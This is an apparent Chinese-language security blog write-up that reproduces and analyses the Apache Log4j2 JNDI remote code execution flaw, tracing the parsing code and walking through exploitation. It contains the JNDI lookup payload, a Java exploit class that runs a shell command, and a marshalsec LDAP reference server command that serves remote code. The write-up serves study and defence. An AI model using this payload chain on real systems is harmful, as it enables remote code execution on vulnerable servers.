> 原文链接: https://www.anquanke.com//post/id/262668 


# Apache Log4j2 远程代码执行漏洞分析


                                阅读量   
                                **139206**
                            
                        |
                        
                                                                                    



[![](https://p5.ssl.qhimg.com/t0133652fc0aefa305c.jpg)](https://p5.ssl.qhimg.com/t0133652fc0aefa305c.jpg)



## 0x01 漏洞简介

Apache **Log4j2**是一个基于Java的日志记录工具。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。

漏洞适用版本为2.0 &lt;= Apache log4j2 &lt;= 2.14.1，只需检测Java应用是否引入 log4j-api , log4j-core 两个jar。若存在应用使用，极大可能会受到影响。



## 0x02 环境搭建

创建Maven项目，并将以下配置文件放在pom.xml中

```
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt;
    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;

    &lt;groupId&gt;groupId&lt;/groupId&gt;
    &lt;artifactId&gt;xxxx&lt;/artifactId&gt;
    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;

    &lt;properties&gt;
        &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt;
        &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt;
    &lt;/properties&gt;
    &lt;dependencies&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
            &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;
            &lt;version&gt;2.14.1&lt;/version&gt;
        &lt;/dependency&gt;
    &lt;/dependencies&gt;

&lt;/project&gt;
```

在[https://logging.apache.org/log4j/2.x/download.html](https://logging.apache.org/log4j/2.x/download.html) 下载编译好的Apache Log4j jar包

[![](https://p0.ssl.qhimg.com/t0183cff1a2245bedcc.png)](https://p0.ssl.qhimg.com/t0183cff1a2245bedcc.png)

最后在项目中添加log4j-core-2.14.1.jar 依赖

[![](https://p5.ssl.qhimg.com/t01d527e30c902b7501.png)](https://p5.ssl.qhimg.com/t01d527e30c902b7501.png)

将项目创建好后即可添加漏洞代码

```
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
public class Main `{`
    private static final Logger logger = LogManager.getLogger();
    public static void main(String[] args) `{`
        logger.error("$`{`jndi:ldap://ip:1389/#Exploit`}`");
    `}`
`}`
```



## 0x03 漏洞分析

### <a class="reference-link" name="0x1%20%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91"></a>0x1 漏洞触发

本次漏洞触发相当简单，只要使用了org/apache/logging/log4j/spi/AbstractLogger.java log进行记录，且log等级为可记录等级即可触发。

```
private static final Logger logger = LogManager.getLogger();
public static void main(String[] args) `{`
  logger.error("$`{`jndi:ldap://ip:1389/#Exploit`}`");
`}`
```

一旦在log字符串中检测到$`{``}`，就会解析其中的字符串尝试使用lookup查询，因此只要能控制log参数内容，就有机会实现漏洞利用。因此也可以使用如下方式触发

```
logger.error("8881273asdf$`{`jndi:ldap://ip:1389/#Exploit`}`aksdjfhuip8efas");
```

### <a class="reference-link" name="0x2%20%E5%85%A5%E5%8F%A3%E5%87%BD%E6%95%B0"></a>0x2 入口函数

本次漏洞的入口函数为logIfEnabled，然而如果使用了AbstractLogger.java中的debug、info、warn、error、fatal等都会触发到该函数

[![](https://p3.ssl.qhimg.com/t012ac8574e28368116.png)](https://p3.ssl.qhimg.com/t012ac8574e28368116.png)

[![](https://p2.ssl.qhimg.com/t01ccbae02b88089e94.png)](https://p2.ssl.qhimg.com/t01ccbae02b88089e94.png)

### <a class="reference-link" name="0x3%20%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E4%B9%8B%E5%8C%B9%E9%85%8D"></a>0x3 核心原理之匹配

该漏洞的核心原理为，在正常的log处理过程中对** $`{`** 这两个紧邻的字符做了检测，一旦匹配到类似于表达式结构的字符串就会触发替换机制。

[![](https://p2.ssl.qhimg.com/t01455e99ea797e7984.png)](https://p2.ssl.qhimg.com/t01455e99ea797e7984.png)

替换机制采用this.config.getStrSubstitutor().replace 函数，该处理函数调用栈如下

[![](https://p2.ssl.qhimg.com/t019830fea886f4ed38.png)](https://p2.ssl.qhimg.com/t019830fea886f4ed38.png)

### <a class="reference-link" name="0x4%20%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E4%B9%8B%E8%A7%A3%E6%9E%90"></a>0x4 核心原理之解析

在replace函数中存在此次漏洞的关键部分提取**$`{``}`**内的lookup参数。经过两层substitute调用后，相关提取代码如下

[![](https://p4.ssl.qhimg.com/t01692f12a1dbf86614.png)](https://p4.ssl.qhimg.com/t01692f12a1dbf86614.png)

简单来说，pos为当前字符串头指针，prefixMatcher.isMatch只负责匹配 **$`{` **两个字符。如果匹配到就进入第二层循环匹配，原理和代码相似。如果没有匹配到**`}`**字符，pos指针就正常+1。

[![](https://p1.ssl.qhimg.com/t01dbca307701471b91.png)](https://p1.ssl.qhimg.com/t01dbca307701471b91.png)

下面代码为匹配**`}`**字符

[![](https://p2.ssl.qhimg.com/t01bd52fca65872fbbc.png)](https://p2.ssl.qhimg.com/t01bd52fca65872fbbc.png)

一旦匹配到**`}`**字符，代码就会进入第三个阶段，提取表达式的内容赋值给varNameExpr变量

[![](https://p4.ssl.qhimg.com/t01c891961857eeea24.png)](https://p4.ssl.qhimg.com/t01c891961857eeea24.png)

那么表达式解析部分就到这里结束了。目前解析到的字符串为

```
jndi:ldap://127.0.0.1:1389/
```

### <a class="reference-link" name="0x5%20%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E4%B9%8B%E6%9F%A5%E8%AF%A2"></a>0x5 核心原理之查询

在正确提取表达式内容后，log4j将会使用该内容作为lookup参数，进行正常的lookup查询。代码如下

[![](https://p3.ssl.qhimg.com/t01cef6a58f0dd58a9b.png)](https://p3.ssl.qhimg.com/t01cef6a58f0dd58a9b.png)

通过调试发现interpolator类的lookup函数会以**:**为分隔符进行分割以获取prefix内容，笔者传入的prefix内容为jndi字符串因此this.strLookupMap获取到的类为JndiLookup类，如下图所示。

[![](https://p1.ssl.qhimg.com/t01bf6a522cf9b10796.png)](https://p1.ssl.qhimg.com/t01bf6a522cf9b10796.png)

之后又通过jndiManager类进行调用，成功执行到javax/naming/InitialContext.java 原生lookup解析函数

[![](https://p3.ssl.qhimg.com/t01146a065960a558dd.png)](https://p3.ssl.qhimg.com/t01146a065960a558dd.png)



## 0x04 漏洞利用

### <a class="reference-link" name="0x1%20%E7%BC%96%E5%86%99%E5%88%A9%E7%94%A8%E7%B1%BB"></a>0x1 编写利用类

因为利用ldap方式进行命令执行，首先要编写最后的命令执行代码。<br>
Exploit.java

```
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;
import javax.print.attribute.standard.PrinterMessageFromOperator;
public class Exploit`{`
    public Exploit() throws IOException,InterruptedException`{`
        String cmd="touch /tmp/xxx";
        final Process process = Runtime.getRuntime().exec(cmd);
        printMessage(process.getInputStream());;
        printMessage(process.getErrorStream());
        int value=process.waitFor();
        System.out.println(value);
    `}`

    private static void printMessage(final InputStream input) `{`
        // TODO Auto-generated method stub
        new Thread (new Runnable() `{`
            @Override
            public void run() `{`
                // TODO Auto-generated method stub
                Reader reader =new InputStreamReader(input);
                BufferedReader bf = new BufferedReader(reader);
                String line = null;
                try `{`
                    while ((line=bf.readLine())!=null)
                    `{`
                        System.out.println(line);
                    `}`
                `}`catch (IOException  e)`{`
                    e.printStackTrace();
                `}`
            `}`
        `}`).start();
    `}`
`}`
```

编译代码后，开启HTTP服务

```
javac Exploit.java
```

[![](https://p2.ssl.qhimg.com/t0128871c86e25a7cd8.png)](https://p2.ssl.qhimg.com/t0128871c86e25a7cd8.png)

### <a class="reference-link" name="0x2%20%E5%BC%80%E5%90%AFldap%E6%9C%8D%E5%8A%A1"></a>0x2 开启ldap服务

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8800/#Exploit
```

[![](https://p4.ssl.qhimg.com/t011c3f52f6699454c8.png)](https://p4.ssl.qhimg.com/t011c3f52f6699454c8.png)​



## 0x05 总结

通过复现调试该漏洞，深入了解了apache Log4j2日志记录的底层原理。关于该漏洞的利用网上还有很多姿势，整体来讲漏洞利用简单，且漏洞危害巨大，配合一些其他服务及系统有可能产生更大的影响。



## 参考文章

[https://mp.weixin.qq.com/s/K74c1pTG6m5rKFuKaIYmPg](https://mp.weixin.qq.com/s/K74c1pTG6m5rKFuKaIYmPg)<br>[https://nosec.org/home/detail/4917.html](https://nosec.org/home/detail/4917.html)
